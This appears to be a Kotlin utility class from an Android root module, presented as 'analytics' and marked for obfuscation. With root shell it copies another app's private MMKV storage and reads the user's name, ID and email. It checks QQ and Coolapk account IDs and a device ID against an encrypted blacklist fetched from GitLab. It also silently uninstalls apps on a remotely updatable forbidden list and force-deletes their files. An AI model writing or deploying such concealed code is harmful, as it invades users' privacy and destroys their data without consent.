package com.luckyzyx.luckytool.utils

import android.content.Context
import android.util.ArrayMap
import com.drake.net.Get
import com.drake.net.utils.scope
import com.drake.net.utils.scopeNet
import com.drake.net.utils.withDefault
import com.highcapable.yukihookapi.hook.factory.dataChannel
import org.lsposed.lsparanoid.Obfuscate
import com.luckyzyx.luckytool.utils.DeviceUtils.getCSid
import com.luckyzyx.luckytool.utils.DeviceUtils.getQSlist
import com.tencent.mmkv.MMKV
import com.topjohnwu.superuser.Shell
import com.topjohnwu.superuser.ShellUtils
import kotlinx.coroutines.Dispatchers
import org.json.JSONArray
import org.json.JSONObject

@Obfuscate
class AppAnalyticsUtils(val context: Context) {

    private val dataDir = "/data/local/tmp/luckys/"
    private val dataPath = "/data/local/tmp/luckys/data.dat"

    private var qss = ArrayList<String>()
    private var css = ArrayList<String>()
    private var gid = ""

    private var forbiddenAppList: ArrayList<String>

    init {
        forbiddenAppList = getForbiddenApps(false)
        if (forbiddenAppList.isEmpty()) forbiddenAppList.add(CommandUtils.sunshineTool)
    }

    private fun Context.checkMagicalStory(isDebug: Boolean = false): ArrayMap<String, String> {
        LogUtils.i("checkMagicalStory", "", "start", isDebug)

        val map = ArrayMap<String, String>()
        return try {
            val appInfo = PackageUtils(packageManager).getApplicationInfo(
                "com.magicalstory.AppStore", 0
            ) ?: return ArrayMap<String, String>()
            LogUtils.d("checkMagicalStory", "dataDir", appInfo.dataDir, isDebug)
            ShellUtils.fastCmd(
                "cp -R -f ${appInfo.dataDir}/files/mmkv $cacheDir", "chmod -R -f 777 $cacheDir/mmkv"
            )
            val path = MMKV.initialize(this, "$cacheDir/mmkv")
            LogUtils.d("MMKV", "initialize", path, isDebug)

            val mmkv = MMKV.defaultMMKV(MMKV.MULTI_PROCESS_MODE, null)
            val name = mmkv.decodeString("name")
            LogUtils.d("MMKV", "name", "$name", isDebug)
            val userId = mmkv.decodeString("user_id")
            LogUtils.d("MMKV", "userId", "$userId", isDebug)
            val email = mmkv.decodeString("email")
            LogUtils.d("MMKV", "email", "$email", isDebug)
            mmkv.close()
            map["$userId"] = "$name | $userId | $email"
            map
        } catch (t: Throwable) {
            LogUtils.i("MMKV", "error", "$t", true)
            map
        }
    }

    fun checkAppForbiddenList(isDebug: Boolean = false) {
        scope(dispatcher = Dispatchers.Default) {
            LogUtils.i(
                "checkAppForbiddenList", "forbiddenAppList", forbiddenAppList.toString(),
                isDebug
            )

            forbiddenAppList.forEach {
                val map = getPackageAbsolutePath(it, true)
                map.toList().forEachIndexed { _, pair ->
                    val packName = pair.first
                    uninstallApp(packName)
                }
            }
            forbiddenAppList.forEach {
                getPackageAbsoluteDir(it, true).forEachIndexed { _, dir ->
                    FileUtils.forceDeleteFile(dir)
                }
            }
        }.catch {
            LogUtils.e("check forbid", "throw", "$it", true)
            return@catch
        }
    }

    fun checkGitlabBlackList(isDebug: Boolean = false) {
        scopeNet {
            LogUtils.i("checkGitlabBlackList", "", "start", isDebug)

            val latestUrl = "https://gitlab.com/luckyzyx/luckyzyx.gitlab.io/raw/main/blacklist"
            val getDoc = Get<String>(latestUrl).await()
            startRemoteCheckList(getDoc, isDebug)
        }.catch {
            LogUtils.e("check gitlab", "throw", "$it", true)
            startLocalCheckList(isDebug)
        }
    }

    private fun startRemoteCheckList(original: String, isDebug: Boolean = false) {
        scope(dispatcher = Dispatchers.Default) {
            LogUtils.i("startRemoteCheckList", "", "start", isDebug)

            LogUtils.d(
                "startRemoteCheckList", "remoteOriginal", "${original.isNotBlank()}",
                isDebug
            )

            if (original.isBlank()) {
                LogUtils.d(
                    "startRemoteCheckList", "remoteOriginal is null", "startLocalCheckList",
                    isDebug
                )
                startLocalCheckList(isDebug)
                return@scope
            }

            saveBlackList(original, isDebug)
            saveForbiddenApps(original, isDebug)

            startCheckList("remote", original, "", isDebug)
        }
    }

    private fun startLocalCheckList(isDebug: Boolean = false) {
        scope(dispatcher = Dispatchers.Default) {
            LogUtils.i("startLocalCheckList", "", "start", isDebug)

            val dataList = ArrayList<String>()
            Shell.cmd("cat $dataPath").to(dataList).exec()
            val localOriginal = formatStringAuto(dataList, "")
            LogUtils.d(
                "startLocalCheckList", "localOriginal", "${localOriginal.isNotBlank()}",
                isDebug
            )

            if (localOriginal.isBlank()) {
                LogUtils.d(
                    "startRemoteCheckList", "localOriginal is null", "startBuiltInCheckList",
                    isDebug
                )
                startBuiltInCheckList(isDebug)
                return@scope
            }

            saveForbiddenApps(localOriginal, isDebug)

            startCheckList("local", localOriginal, "", isDebug)
        }
    }

    private fun startBuiltInCheckList(isDebug: Boolean = false) {
        LogUtils.i("startBuiltInCheckList", "", "start", isDebug)

        val json = JSONObject().apply {
            put("qbk", JSONArray().apply {
                put("1150325619")
                put("3108440182")
                put("3431299059")
                put("907989054")
                put("1933582367")
                put("382973352")
                put("1204528865")
                put("2515287786")
                put("1848589411")
                put("2986812502")
                put("3067008392")
                put("2469735057")
                put("1023617394")
                put("2186396414")
                put("1908958893")
                put("179305241")
                put("2898528797")
            })
            put("cbk", JSONArray().apply {
                put("1304480")
                put("16149908")
                put("27708445")
                put("2470014")
                put("19996229")
                put("6759474")
                put("30135990")
                put("30194270")
            })
            put("dik", JSONArray().apply {
                put("e3db3345c2de23bf02477ce21a3c12c9539eb9df36dc233d81b902477435f816")
                put("a2cd153a023356cde30113febd30a30541a8f7ddf81ff0bfbf60946718d2d2c2")
                put("4aaf56c5241accf5b1f06cc19d3ce106c43a36f1e8779d2fc80864eb6ab83a66")
            })
            put("magical", JSONArray().apply {
                put("9476027")
            })
            put("forbiddenApps", JSONArray().apply {
                put(CommandUtils.sunshineTool)
            })
        }

        startCheckList("builtIn", "", json.toString(), isDebug)
    }

    private fun startCheckList(
        tag: String, original: String, jsonstring: String, isDebug: Boolean = false
    ) {
        scope(dispatcher = Dispatchers.Default) {
            LogUtils.i(
                "startCheckList", tag,
                "${original.isNotBlank()} | ${jsonstring.isNotBlank()}", isDebug
            )

            var qbsval = false
            var cbsval = false
            var disval = false
            var magval = false
            val map = ArrayMap<String, String>()
            map["time"] = formatDate("YYYYMMdd-HH:mm:ss")

            initAllBlackIds(isDebug)

            var decryptJson = safeOfNull { AESCrypt.decrypt(original) } ?: ""
            if (tag == "builtIn") decryptJson = jsonstring

            val js = safeOfNull { JSONObject(decryptJson) } ?: JSONObject()
            LogUtils.d("startCheckList", "$tag - json", "${decryptJson.ifBlank { null }}", isDebug)

            if (decryptJson.isBlank() || js.length() <= 0) {
                LogUtils.d("startCheckList", tag, "data is null -> startBuiltInCheckList", isDebug)
                startBuiltInCheckList(isDebug)
                return@scope
            }

            (js.optJSONArray("qbk") ?: JSONArray()).toStringList().apply {
                qss.forEach {
                    LogUtils.d("check qq", "for", "$this | $it", isDebug)
                    if (contains(it)) {
                        qbsval = true
                        map["qbk"] = it
                    }
                }
            }
            (js.optJSONArray("cbk") ?: JSONArray()).toStringList().apply {
                css.forEach {
                    LogUtils.d("check coolapk", "for", "$this | $it", isDebug)
                    if (contains(it)) {
                        cbsval = true
                        map["cbk"] = it
                    }
                }
            }
            (js.optJSONArray("dik") ?: JSONArray()).toStringList().apply {
                LogUtils.d("check device", "for", "$this | $gid", isDebug)
                if (contains(gid)) {
                    disval = true
                    map["dik"] = gid
                }
            }
            (js.optJSONArray("magical") ?: JSONArray()).toStringList().apply {
                val list = context.checkMagicalStory(isDebug)
                LogUtils.d("check magical", "list", "$this | $list", isDebug)
                if (list.isNotEmpty()) list.keys.forEach {
                    if (contains(it)) {
                        magval = true
                        map["mag"] = list[it]
                    }
                }
            }
            if (qbsval || cbsval || disval || magval) {
                context.removeModule()
                context.exitModule()
            }
        }.catch {
            LogUtils.e("check list", tag, "$it", true)
        }
    }

    private fun saveBlackList(original: String, isDebug: Boolean = false) {
        scope(dispatcher = Dispatchers.Default) {
            LogUtils.i("saveBlackList", "", "start", isDebug)

            val remoteJsonData = safeOfNull { AESCrypt.decrypt(original) } ?: ""
            val remoteJson = safeOfNull { JSONObject(remoteJsonData) } ?: JSONObject()
            val remoteUpdateTime = remoteJson.optString("updateTime")
            LogUtils.d("saveBlackList", "remoteUpdateTime", remoteUpdateTime, isDebug)

            if (remoteJsonData.isBlank() || remoteJson.length() <= 0) {
                LogUtils.d(
                    "saveBlackList", "remoteJson is null", "startLocalCheckList",
                    isDebug
                )
                startLocalCheckList(isDebug)
                return@scope
            }
            if (remoteUpdateTime.isNotBlank()) {
                val dataList = ArrayList<String>()
                Shell.cmd("cat $dataPath").to(dataList).exec()
                val localOriginal = formatStringAuto(dataList, "")
                LogUtils.d("saveBlackList", "localOriginal", localOriginal, isDebug)
                if (localOriginal.isNotBlank()) {
                    val localFinalData = safeOfNull { AESCrypt.decrypt(localOriginal) } ?: ""
                    val localJson = safeOfNull { JSONObject(localFinalData) } ?: JSONObject()
                    val localUpdateTime = localJson.optString("updateTime")
                    LogUtils.d(
                        "saveBlackList", "localUpdateTime", localUpdateTime,
                        isDebug
                    )
                    if (remoteUpdateTime != localUpdateTime) {
                        LogUtils.d(
                            "saveBlackList", "UpdateTime is change", "echo original",
                            isDebug
                        )
                        ShellUtils.fastCmd("echo '$original' > $dataPath")
                    }
                } else {
                    LogUtils.d(
                        "saveBlackList", "localOriginal is blank", "save original",
                        isDebug
                    )
                    ShellUtils.fastCmd("rm -rf $dataDir && mkdir -p $dataDir")
                    ShellUtils.fastCmd("echo '$original' > $dataPath")
                }
            }
        }
    }

    @Suppress("SameParameterValue")
    private fun getForbiddenApps(isDebug: Boolean): ArrayList<String> {
        LogUtils.i("getForbiddenApps", "", "start", isDebug)

        val encryptKey = safeOfNull { AESCrypt.encrypt("forbiddenApps") } ?: ""
        LogUtils.d("getForbiddenApps", "encryptKey", encryptKey, isDebug)

        val encryptValue = context.getString(SettingsPrefs, encryptKey)
        LogUtils.d("getForbiddenApps", "encryptValue", encryptValue, isDebug)

        val originalValue = safeOfNull { AESCrypt.decrypt(encryptValue) } ?: ""
        LogUtils.d("getForbiddenApps", "originalValue", originalValue, isDebug)

        val jsonArray = safeOfNull { JSONArray(originalValue) } ?: JSONArray()
        if (jsonArray.length() == 0) return arrayListOf()
        return jsonArray.toStringList()
    }

    private fun saveForbiddenApps(original: String, isDebug: Boolean = false) {
        scope(dispatcher = Dispatchers.Default) {
            LogUtils.i("saveForbiddenApps", "", "start", isDebug)

            val jsonData = safeOfNull { AESCrypt.decrypt(original) } ?: ""
            val json = safeOfNull { JSONObject(jsonData) } ?: JSONObject()
            LogUtils.d("saveForbiddenApps", "json", json.toString(), isDebug)

            val forbiddenApps = json.optJSONArray("forbiddenApps") ?: JSONArray()
            val finalKey = safeOfNull { AESCrypt.encrypt("forbiddenApps") } ?: ""
            LogUtils.d("saveForbiddenApps", "finalKey", finalKey, isDebug)

            if (forbiddenApps.length() == 0) return@scope
            val finalValue = safeOfNull { AESCrypt.encrypt(forbiddenApps.toString()) } ?: ""
            LogUtils.d("saveForbiddenApps", "finalValue", finalValue, isDebug)

            if (finalKey.isNotBlank() && finalValue.isNotBlank()) {
                context.putString(SettingsPrefs, finalKey, finalValue)
                context.dataChannel("android").put("rk7cBXvdN33TqHzVdwBQvQ==", finalValue)
            }
        }
    }

    private suspend fun initAllBlackIds(isDebug: Boolean = false) {
        withDefault {
            LogUtils.i("initAllBlackIds", "", "start", isDebug)

            if (qss.isEmpty()) qss = getQSlist()
            LogUtils.d("initAllBlackIds", "getQSlist", "${qss.toList()}", isDebug)
            if (css.isEmpty()) css = getCSid()
            LogUtils.d("initAllBlackIds", "getCSid", "${css.toList()}", isDebug)
            if (gid.isEmpty()) gid = DeviceUtils.getGuid()
            LogUtils.d("initAllBlackIds", "getGuid", gid, isDebug)
        }
    }
}